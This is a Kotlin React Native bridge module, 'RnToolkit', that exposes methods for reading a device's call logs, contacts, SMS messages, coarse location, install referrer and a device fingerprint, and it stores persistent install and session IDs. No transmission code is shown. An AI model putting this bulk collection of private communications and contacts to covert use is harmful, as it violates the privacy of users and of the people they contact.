package com.rntoolkit

import com.rntoolkit.fingerprint.createFingerprint
import com.rntoolkit.utils.*
import com.rntoolkit.helpers.*
import android.util.Log

import android.content.Context
import android.content.pm.PackageManager
import android.content.SharedPreferences

import com.facebook.react.bridge.ReactApplicationContext
import com.facebook.react.module.annotations.ReactModule
import com.facebook.react.bridge.Promise
import com.facebook.react.bridge.ReadableType
import com.facebook.react.bridge.Arguments
import com.facebook.react.bridge.ReadableMap
import com.facebook.react.bridge.WritableMap
import java.lang.Exception

object PrefsKeys {
  const val ID = "AppPrefs"
  const val INSTALL_ID = "install_id"
  const val SESSION_ID = "session_id"
  const val FIRST_LAUNCH = "is_first_launch"
}

@ReactModule(name = RnToolkitModule.NAME)
class RnToolkitModule(reactContext: ReactApplicationContext) :
  NativeRnToolkitSpec(reactContext) {

  var context: ReactApplicationContext = reactApplicationContext

  val isFirstLaunch: Boolean by lazy { checkFirstLaunch() }

  private val prefs: SharedPreferences by lazy {
    context.getSharedPreferences(PrefsKeys.ID, Context.MODE_PRIVATE)
  }

  override fun initialize() {
    if(isFirstLaunch) {
      saveUniqueIdInShared()
    }
  }

  override fun getIsFirstLaunch(): Boolean = isFirstLaunch

  override fun getInstallReferrer(promise: Promise) {
    getInstallReferrer(context)
      .onSuccess { resultMap ->
        promise.resolve(resultMap)
      }
      .onFailure { exception ->
        promise.reject("INSTAL_REFERRER_ERROR", exception)
      }
  }

  override fun getCoarseLocation(promise: Promise) {
    getCoarseLocation(context)
      .onFailure { error ->
        promise.reject("LOCATION_ERROR", error)
      }
      .onSuccess { locationMap ->
        promise.resolve(locationMap)
      }
  }

  override fun getInstallId(): String = prefs.getString(PrefsKeys.INSTALL_ID, "") ?: ""

  override fun getAppVersion(): String? = getAppVersion(context)

  override fun getSessionId(): String? = prefs.getString(PrefsKeys.SESSION_ID, null)

  override fun createSessionId(): String {
    return generateUniqueId().also { id ->
      prefs.edit().putString(PrefsKeys.SESSION_ID, id).apply()
    }
  }

  override fun getLocalDateTime(): String = getDateTime()

  override fun getOSParameters(promise: Promise) {
    getOSParameters(context)
      .onSuccess { parameters ->
        promise.resolve(parameters)
      }
      .onFailure { error ->
        promise.reject("GET_OS_PARAMETERS_ERROR", error)
      }
  }

  override fun getCalls(promise: Promise) {
    try {
      val logs = getCallLogs(context)
      promise.resolve(logs)
    } catch (e: Exception) {
      promise.reject("CALL_LOG_ERROR", "Failed to read call logs", e)
    }
  }

  override fun getContacts(promise: Promise) {
    try {
      val contacts = getContactsLogs(context)
      promise.resolve(contacts)
    } catch (e: Exception) {
      promise.reject("CONTACTS_LOG_ERROR", "Failed to read contacts logs", e)
    }
  }

  override fun getSMS(promise: Promise) {
    try {
      val sms = getSMSLogs(context)
      promise.resolve(sms)
    } catch (e: Exception) {
      promise.reject("SMS_LOG_ERROR", "Failed to read sms logs", e)
    }
  }

  override fun getFingerprint(promise: Promise) {
    createFingerprint(context)
      .onSuccess { fingerprint ->
        promise.resolve(fingerprint)
      }
      .onFailure { error ->
        promise.reject("FINGERPRINT_ERROR", error)
      }
  }

  private fun checkFirstLaunch(): Boolean {
    return prefs.getBoolean(PrefsKeys.FIRST_LAUNCH, true)
      .also { isFirst ->
        if (isFirst) {
          prefs.edit().putBoolean(PrefsKeys.FIRST_LAUNCH, false).apply()
        }
      }
  }

  private fun saveUniqueIdInShared() {
    // сохраняет в хранилище уникальный id ( пока непонтяно зачем)
    // 6 параметр из сбораДанных
    val id = generateUniqueId()

    prefs.edit().putString(PrefsKeys.INSTALL_ID, id).apply()
  }

  override fun getName(): String {
    return NAME
  }

  companion object {
    const val NAME = "RnToolkit"
  }

}
